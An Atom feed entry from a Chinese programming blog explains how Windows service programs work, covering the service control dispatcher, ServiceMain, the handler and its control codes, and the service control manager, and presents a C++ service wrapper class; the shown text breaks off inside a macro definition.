<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>megrez</title>
  
  <subtitle>不积跬步，无以至千里</subtitle>
  <link href="https://guapizhu.github.io/atom.xml" rel="self"/>
  
  <link href="https://guapizhu.github.io/"/>
  <updated>2020-11-19T02:58:33.106Z</updated>
  <id>https://guapizhu.github.io/</id>
  
  <author>
    <name>megrez</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Windows服务框架与服务的编写</title>
    <link href="https://guapizhu.github.io/2020/11/19/windows-fu-wu-kuang-jia-yu-fu-wu-de-bian-xie/"/>
    <id>https://guapizhu.github.io/2020/11/19/windows-fu-wu-kuang-jia-yu-fu-wu-de-bian-xie/</id>
    <published>2020-11-19T03:00:00.000Z</published>
    <updated>2020-11-19T02:58:33.106Z</updated>
    
    <content type="html"><![CDATA[<p>原文链接：<a href="https://blog.csdn.net/lanuage/article/details/77937407">https://blog.csdn.net/lanuage/article/details/77937407</a></p><p>从NT内核开始，服务程序已经变为一种非常重要的系统进程，一般的驻守进程和普通的程序必须在桌面登录的情况下才能运行，而许多系统的基础程序必须在用户登录桌面之前就要运行起来，而利用服务，可以很方便的实现这种功能，而且服务程序一般不予用户进行交互，可以安静的在后台执行，合理的利用服务程序可以简化我们的系统设计，比如Windows系统的日志服务,IIS服务等等。<br>服务程序本身是依附在某一个可执行文件之中，系统将服务安装在注册表中的HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services位置，当需要执行服务程序时，由系统的服务控制管理器在注册表中对应的位置读取服务信息，并启动对应的程序。<br>下面从几个方面详细说明服务程序的基本框架</p><h2 id="服务程序的框架"><a href="#服务程序的框架" class="headerlink" title="服务程序的框架"></a>服务程序的框架</h2><p>服务程序本身也是依附在exe或者dll文件中，一般一个普通的可执行文件中可以包含一个或者多个服务，但是为了代码的维护性，一般一个程序总是只包含一个服务。<br>服务程序是由服务管理器负责调度，控制的，所以我们在编写服务程序的时候必须满足服务控制管理器的调度，必须包含：<br>\1. 立即调用StartServiceCtrlDispatchar函数把进程的主线程连接到ServiceControlManager的主函数<br>\2. 在进程中运行的各个服务的入口点函数ServiceMain<br>\3. 在进程中运行的各个服务的控制处理函数Handler<br>ServiceControlManager函数的原型如下：</p><pre class="line-numbers language-cpp"><code class="language-cpp">BOOL WINAPI <span class="token function">StartServiceCtrlDispatcher</span><span class="token punctuation">(</span>  __in  <span class="token keyword">const</span> SERVICE_TABLE_ENTRY<span class="token operator">*</span> lpServiceTable<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">123</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>函数参数是一个SERVICE_TABLE_ENTRY类型的指针，这个类型的定义如下：</p><pre class="line-numbers language-cpp"><code class="language-cpp"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> _SERVICE_TABLE_ENTRY <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>      LPTSTR lpServiceName<span class="token punctuation">;</span>      LPSERVICE_MAIN_FUNCTION lpServiceProc<span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span> SERVICE_TABLE_ENTRY<span class="token punctuation">,</span>  <span class="token operator">*</span>LPSERVICE_TABLE_ENTRY<span class="token punctuation">;</span><span class="token number">12345</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个结构是一个服务名称和对应入口函数指针的映射。在传入的时候必须给一个该类型的数组，数组的每一项都代表一个服务与其入口函数指针的映射，同时这个数组的最后一组必须为NULL<br>当启动服务的时候，系统会启动对应的进程，当进程代码执行到StartServiceCtrlDispatcher时，程序由服务控制管理器接管，服务控制管理器根据需要启动的服务名称，在传入的数组指针中，找到对应的入口函数，然后调用它，当对应的入口函数返回时结束服务，并将后续代码的控制权转交给对应主进程，由主进程接着执行后面的代码<br>在入口函数中我们必须给服务一个控制管理程序，这个程序主要是用来处理服务程序接受到的各种控制消息，比如启动服务，暂停服务，停止服务等，这个函数有点类似于Windows 窗口程序中的窗口过程。这个函数由我们自己编写，然后调用函数RegisterServiceCtrlHandler(Ex) 将服务名称与对应的控制函数绑定，每当有一个控制事件发生时都会调用我们注册的函数进行处理，RegisterServiceCtrlHandler函数会返回一个句柄，作为服务的控制句柄。当我们要自己向服务控制管理器报告服务的当前状态时需要这个句柄。</p><h2 id="服务的启动过程"><a href="#服务的启动过程" class="headerlink" title="服务的启动过程"></a>服务的启动过程</h2><p>已经安装的服务，被系统存储在注册表的HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services<br>位置处，这个注册表项纪录了服务所依赖的exe或者dll文件，它的启动类型等信息，当我们尝试启动服务的时候，系统会在注册表的对应位置查找是否存在对应服务的表项，如果存在则启动对应的进程。当进程的代码执行到StartServiceCtrlDispatcher函数时，该进程将由服务控制管理器接管，服务控制管理器将会根据填入的SERVICE_TABLE_ENTRY，找到服务所对应的入口函数开启对应的服务线程并调用，在入口函数处会注册一个控制句柄，然后应该向服务控制管理程序报告当前状态为正在启动，然后执行服务的正式代码。（注意:<strong>由于服务的入口函数需要自己编写，所以这里提到的注册控制句柄，报告状态都应该是由程序员自己编写代码实现</strong>）</p><h2 id="Handler函数"><a href="#Handler函数" class="headerlink" title="Handler函数"></a>Handler函数</h2><p>handler函数用来处理服务的控制请求，这个函数由RegisterServiceCtrlHandler(Ex)函数注册到系统，当服务控制请求到来时，由服务的主线程的控制分发线程来调用。综合上面的内容，可以看到一个服务程序应该是至少涉及到3个线程，进程的主线程，服务线程，控制分发线程，RegisterServiceCtrlHandler(Ex)的原型如下：</p><pre class="line-numbers language-cpp"><code class="language-cpp">SERVICE_STATUS_HANDLE WINAPI <span class="token function">RegisterServiceCtrlHandlerEx</span><span class="token punctuation">(</span>  __in      LPCTSTR lpServiceName<span class="token punctuation">,</span>  __in      LPHANDLER_FUNCTION_EX lpHandlerProc<span class="token punctuation">,</span>  __in_opt  LPVOID lpContext<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">12345</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>不带Ex的版本只有前两个参数，带Ex版本的第3个参数是一个传入到对应的控制函数中的参数。对应提供的控制管理函数的原型如下：</p><pre class="line-numbers language-cpp"><code class="language-cpp">DWORD WINAPI <span class="token function">HandlerEx</span><span class="token punctuation">(</span>  __in  DWORD dwControl<span class="token punctuation">,</span>  __in  DWORD dwEventType<span class="token punctuation">,</span>  __in  LPVOID lpEventData<span class="token punctuation">,</span>  __in  LPVOID lpContext<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">123456</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>第一个参数是一个控制码，类似于GUI程序中的消息，根据这个控制码就可以知道对应的控制消息，下面列举常见的控制码：</p><table><thead><tr><th>控制码</th><th>含义</th></tr></thead><tbody><tr><td>SERVICE_CONTROL_STOP</td><td>请求服务停止</td></tr><tr><td>SERVICE_CONTROL_PAUSE</td><td>请求暂停服务</td></tr><tr><td>SERVICE_CONTROL_CONTINUE</td><td>请求恢复暂停的服务</td></tr><tr><td>SERVICE_CONTROL_INTERROGATE</td><td>请求服务立即更新它的当前状态信息给服务控制管理程序</td></tr><tr><td>SERVICE_CONTROL_SHUTDOWN</td><td>请求服务执行清理任务,因为系统正在关机.由于只有非常有限的时间用来关机,所以这个控制只应由绝对需要关机的服务使用.例如:事件登录服务需要清理维护的文件中的脏字节,或服务需要关机以便当系统在关机状态时网络连接不能进行. 如果服务关键要花时间,并发出STOP_PENDING状态信息,强烈建议这些消息包括一个等待提示使得服务控制程序知道在给系统指明服务关机完成之前要等多长时间.系统给服务控制管理器有限的时间(约20秒)完成服务关机,在这个时间后无论服务关机动作是否完成都进行系统关机</td></tr></tbody></table><p>第二个参数是事件类型，对于有的控制码，它可能含有子控制类型来详细描述它，就好像WM_COMMAND消息中有子控件的相关消息<br>第三个参数是事件参数，这个参数是子控制码对应的参数<br>第四个参数是上面带Ex的函数第三个参数传进来的内容<br><strong>每次Handler函数被调用时,服务必须调用SetServiceStatus函数把状态报告给服务管理器程序注意:即使状态无变化也要报告</strong></p><h2 id="服务控制管理器"><a href="#服务控制管理器" class="headerlink" title="服务控制管理器"></a>服务控制管理器</h2><p>在服务中一般有3类对象（在这并不是指Windows系统的内核对象，这里只是为了便于理解给出的一个分类）：<br>\1. 服务程序对象：服务本身的代码，一般是服务主要完成的功能代码<br>\2. 服务控制对象：用来控制服务，向服务发送执行<br>\3. 服务管理对象：用来响应对应的控制码，主要是指服务的handler函数<br>与GUI程序相类比，服务对象就好比GUI程序本身，服务控制对象就好像我们在操作GUI程序，比如点击鼠标，而服务控制对象就像窗口的窗口过程<br>服务管理器由SCManager对象代表。SCManager对象是持有服务对象的容器对象。SCManager对象和服务对象的句柄类型是SC_HANDLE。我们可以使用函数OpenService来在服务管理器中打开对应服务获取服务对象的句柄，或者使用函数CreateService在服务管理器中创建一个新服务并返回服务的句柄<br>后面关于服务的控制操作请参考本人之前写的一篇关于服务控制管理器的编写的博客<a href="http://blog.csdn.net/lanuage/article/details/51902075">点击这里</a><br>下面通过一个封装的Service库来说明服务程序的框架。这个简单的类的详细代码请<a href="https://github.com/aMonst/Service.git">点击这里下载</a><br>该项目中主要定义了三个类，其中CFSZService类是所有服务类的基类，CServiceCtrl是服务的控制类，该类用于控制服务，这个类中的所有函数都是静态函数。另外为了测试我从CFSZService类上派生了一个类——CTestService，用来编写服务的具体代码。如果以后想要使用这个项目中的代码，可以进行如下操作：<br>\1. FSZService类中派生一个新类，并重载基类的RunService,在这个服务中编写具体的服务代码即可<br>\2. 在相应位置调用DECLARE_SERVICE_TABLE_ENTRY宏，用来声明一个SERVICE_TABLE_ENTRY变量，用来绑定服务和对应的入口函数<br>\3. 在相应位置添加代码：</p><pre class="line-numbers language-cpp"><code class="language-cpp"><span class="token function">IMPLAMENT_SERVICE_MAIN</span><span class="token punctuation">(</span>GetSystemInfoService<span class="token punctuation">,</span> CTestService<span class="token punctuation">)</span><span class="token function">BEGIN_SERVICE_MAP</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token function">ON_SERVICE_MAP</span><span class="token punctuation">(</span>GetSystemInfoService<span class="token punctuation">,</span> CTestService<span class="token punctuation">)</span><span class="token function">END_SERIVCE_MAP</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token number">12345</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>第一个宏用来定义了一个函数，该函数是服务的入口函数，需要传入服务名称，服务的类名称。<br>第二个宏用来将服务名和它对应的入口函数进行绑定。<br>\4. 在主函数处调用CFSZService::RegisterService()，在该函数里面会调用StartServiceCtrlDispatcher，一遍让服务控制管理程序来接管服务代码</p><h3 id="代码的整体说明"><a href="#代码的整体说明" class="headerlink" title="代码的整体说明"></a>代码的整体说明</h3><p>服务基类的定义如下：</p><pre class="line-numbers language-cpp"><code class="language-cpp"><span class="token keyword">class</span> <span class="token class-name">CFSZService</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span><span class="token keyword">public</span><span class="token operator">:</span>    <span class="token keyword">typedef</span> CAtlMap<span class="token operator">&lt;</span>CString<span class="token punctuation">,</span> CFSZService <span class="token operator">*</span><span class="token operator">></span> CFSZServiceMap<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//服务名称和对应的服务对象</span>    <span class="token function">CFSZService</span><span class="token punctuation">(</span><span class="token keyword">const</span> CString<span class="token operator">&amp;</span> csSrvName<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">~</span><span class="token function">CFSZService</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">virtual</span> DWORD <span class="token function">Run</span><span class="token punctuation">(</span>DWORD dwArgc<span class="token punctuation">,</span> LPTSTR<span class="token operator">*</span> lpszArgv<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">virtual</span> BOOL <span class="token function">OnInitService</span><span class="token punctuation">(</span>DWORD dwArgc<span class="token punctuation">,</span> LPTSTR<span class="token operator">*</span> lpszArgv<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//初始化服务</span>    <span class="token keyword">virtual</span> DWORD <span class="token function">RunService</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//运行服务 </span>    <span class="token keyword">void</span> <span class="token function">SetServiceStatusHandle</span><span class="token punctuation">(</span>SERVICE_STATUS_HANDLE<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">static</span> DWORD WINAPI <span class="token function">HandlerEx</span><span class="token punctuation">(</span>DWORD dwControl<span class="token punctuation">,</span> DWORD dwEventType<span class="token punctuation">,</span> LPVOID lpEventData<span class="token punctuation">,</span> LPVOID lpContext<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">static</span> BOOL <span class="token function">RegisterService</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//服务命令处理函数</span><span class="token keyword">protected</span><span class="token operator">:</span>    <span class="token keyword">virtual</span> DWORD <span class="token function">OnStop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">virtual</span> DWORD <span class="token function">OnUserControl</span><span class="token punctuation">(</span>DWORD dwControl<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">virtual</span> DWORD <span class="token function">OnStart</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">virtual</span> DWORD <span class="token function">OnContinue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">virtual</span> DWORD <span class="token function">OnPause</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">virtual</span> DWORD <span class="token function">OnShutdown</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">virtual</span> DWORD <span class="token function">OnInterrogate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">virtual</span> DWORD <span class="token function">OnShutDown</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">protected</span><span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>设备变更事件通知处理 SERVICE_CONTROL_DEVICEEVENT    <span class="token keyword">virtual</span> DWORD <span class="token function">OnDeviceArrival</span><span class="token punctuation">(</span>PDEV_BROADCAST_HDR pDbh<span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token keyword">virtual</span> DWORD <span class="token function">OnDeviceRemoveComplete</span><span class="token punctuation">(</span>PDEV_BROADCAST_HDR pDbh<span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token keyword">virtual</span> DWORD <span class="token function">OnDeviceQueryRemove</span><span class="token punctuation">(</span>PDEV_BROADCAST_HDR pDbh<span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token keyword">virtual</span> DWORD <span class="token function">OnDeviceQueryRemoveFailed</span><span class="token punctuation">(</span>PDEV_BROADCAST_HDR pDbh<span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token keyword">virtual</span> DWORD <span class="token function">OnDeviceRemovePending</span><span class="token punctuation">(</span>PDEV_BROADCAST_HDR pDbh<span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token keyword">virtual</span> DWORD <span class="token function">OnCustomEvent</span><span class="token punctuation">(</span>PDEV_BROADCAST_HDR pDbh<span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token keyword">protected</span><span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>硬件配置文件发生变动 SERVICE_CONTROL_HARDWAREPROFILECHANGE    <span class="token keyword">virtual</span> DWORD <span class="token function">OnConfigChanged</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token keyword">virtual</span> DWORD <span class="token function">OnQueryChangeConfig</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token keyword">virtual</span> DWORD <span class="token function">OnConfigChangeCanceled</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token keyword">protected</span><span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>设备电源事件 SERVICE_CONTROL_POWEREVENT    <span class="token keyword">virtual</span> DWORD <span class="token function">OnPowerSettingChange</span><span class="token punctuation">(</span>PPOWERBROADCAST_SETTING pPs<span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token keyword">protected</span><span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>session 发生变化 SERVICE_CONTROL_SESSIONCHANGE    <span class="token keyword">virtual</span> DWORD <span class="token function">OnWTSConsoleConnect</span><span class="token punctuation">(</span>PWTSSESSION_NOTIFICATION pWn<span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token keyword">virtual</span> DWORD <span class="token function">OnWTSConsoleDisconnect</span><span class="token punctuation">(</span>PWTSSESSION_NOTIFICATION pWns<span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token keyword">virtual</span> DWORD <span class="token function">OnWTSRemoteConnect</span><span class="token punctuation">(</span>PWTSSESSION_NOTIFICATION pWns<span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token keyword">virtual</span> DWORD <span class="token function">OnWTSRemoteDisconnect</span><span class="token punctuation">(</span>PWTSSESSION_NOTIFICATION pWns<span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token keyword">virtual</span> DWORD <span class="token function">OnWTSSessionLogon</span><span class="token punctuation">(</span>PWTSSESSION_NOTIFICATION pWns<span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token keyword">virtual</span> DWORD <span class="token function">OnWTSSessionLogoff</span><span class="token punctuation">(</span>PWTSSESSION_NOTIFICATION pWns<span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token keyword">virtual</span> DWORD <span class="token function">OnWTSSessionLock</span><span class="token punctuation">(</span>PWTSSESSION_NOTIFICATION pWns<span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token keyword">virtual</span> DWORD <span class="token function">OnWTSSessionUnLock</span><span class="token punctuation">(</span>PWTSSESSION_NOTIFICATION pWns<span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token keyword">virtual</span> DWORD <span class="token function">OnWTSSessionRemoteControl</span><span class="token punctuation">(</span>PWTSSESSION_NOTIFICATION pWns<span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token keyword">protected</span><span class="token operator">:</span>    <span class="token comment" spellcheck="true">//内部的工具方法，设置服务为一个指定的状态</span>    BOOL <span class="token function">SetStatus</span><span class="token punctuation">(</span>DWORD dwStatus<span class="token punctuation">,</span>DWORD dwCheckPoint <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span>DWORD dwWaitHint <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">,</span>DWORD dwExitCode <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span>DWORD dwAcceptStatus <span class="token operator">=</span> SERVICE_CONTROL_INTERROGATE<span class="token punctuation">)</span><span class="token punctuation">;</span>    BOOL <span class="token function">SetStartPending</span><span class="token punctuation">(</span>DWORD dwCheckPoint <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span>DWORD dwWaitHint <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//设为正在启动状态</span>    BOOL <span class="token function">SetContinuePending</span><span class="token punctuation">(</span>DWORD dwCheckPoint <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span>DWORD dwWaitHint <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//设为正在继续运行状态</span>    BOOL <span class="token function">SetPausePending</span><span class="token punctuation">(</span>DWORD dwCheckPoint <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span>DWORD dwWaitHint <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//设为正在暂停状态</span>    BOOL <span class="token function">SetPause</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//设为暂停状态</span>    BOOL <span class="token function">SetRunning</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//设为以启动状态</span>    BOOL <span class="token function">SetStopPending</span><span class="token punctuation">(</span>DWORD dwCheckPoint <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span>DWORD dwWaitHint <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//设为正在停止状态</span>    BOOL <span class="token function">SetStop</span><span class="token punctuation">(</span>DWORD dwExitCode <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//设为以停止状态</span>    BOOL <span class="token function">ReportStatus</span><span class="token punctuation">(</span>DWORD<span class="token punctuation">,</span> DWORD<span class="token punctuation">,</span> DWORD<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//向服务管理器报告当前服务状态</span><span class="token keyword">protected</span><span class="token operator">:</span>    CString m_csSrvName<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//服务名称</span>    DWORD m_dwCurrentStatus<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//当前状态</span>    SERVICE_STATUS_HANDLE m_hCtrl<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//控制句柄</span><span class="token keyword">public</span><span class="token operator">:</span>    <span class="token keyword">static</span> CFSZServiceMap ms_SrvMap<span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token number">123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在这个基类中主要定义了3类函数，分别是：<br>\1. 服务本身的代码函数：用来处理服务的业务，实现服务的功能<br>\2. 服务控制管理函数：包括各种控制消息的响应函数和服务控制句柄的管理函数<br>\3. 服务状态设置函数：主要用来设置服务的状态</p><p>该项目使用Atl 和CString,一般在控制台程序中想要使用这二者只需要包含头文件：atlcoll.h、atlstr.h即可</p><h3 id="CFSZServiceMap-成员"><a href="#CFSZServiceMap-成员" class="headerlink" title="CFSZServiceMap 成员"></a>CFSZServiceMap 成员</h3><p>该成员是用来将服务名称和对应的类对象关联起来，这样以后根据服务名称就可以找到对应的服务类的对象指针，该类型定义如下：</p><pre class="line-numbers language-cpp"><code class="language-cpp"><span class="token keyword">typedef</span> CAtlMap<span class="token operator">&lt;</span>CString<span class="token punctuation">,</span> CFSZService <span class="token operator">*</span><span class="token operator">></span> CFSZServiceMap<span class="token punctuation">;</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在每个类的构造函数中进行初始化：</p><pre class="line-numbers language-cpp"><code class="language-cpp">CFSZService<span class="token operator">::</span><span class="token function">CFSZService</span><span class="token punctuation">(</span><span class="token keyword">const</span> CString<span class="token operator">&amp;</span> csSrvName<span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    m_csSrvName <span class="token operator">=</span> csSrvName<span class="token punctuation">;</span>    ms_SrvMap<span class="token punctuation">.</span><span class="token function">SetAt</span><span class="token punctuation">(</span>m_csSrvName<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token number">12345</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="服务的入口函数"><a href="#服务的入口函数" class="headerlink" title="服务的入口函数"></a>服务的入口函数</h3><p>服务的入口函数是利用宏定义的一个函数，每当需要添加一个服务的时候都需要调用宏IMPLAMENT_SERVICE_MAIN来定义一个对应的服务入口ServiceMain,该函数的定义如下：</p><pre class="line-numbers language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">define</span> IMPLAMENT_SERVICE_MAIN(srvName, className)\    VOID WINAPI _ServiceMain_##className(DWORD dwArgc, LPTSTR* lpszArgv)\    &amp;#123;\        CFSZService *pThis = NULL;\        if(!CFSZService::ms_SrvMap.Lookup(_T(#srvName), pThis))\        &amp;#123;\            pThis = dynamic_cast&lt;CFSZService*>( new className(_T(#srvName)) );\        &amp;#125;\        else\        &amp;#123;\            return;\        &amp;#125;\        assert(NULL != pThis);\        SERVICE_STATUS_HANDLE hss = RegisterServiceCtrlHandlerEx(_T(#srvName), CFSZService::HandlerEx, reinterpret_cast&lt;LPVOID>(pThis));\        assert(NULL != hss);\        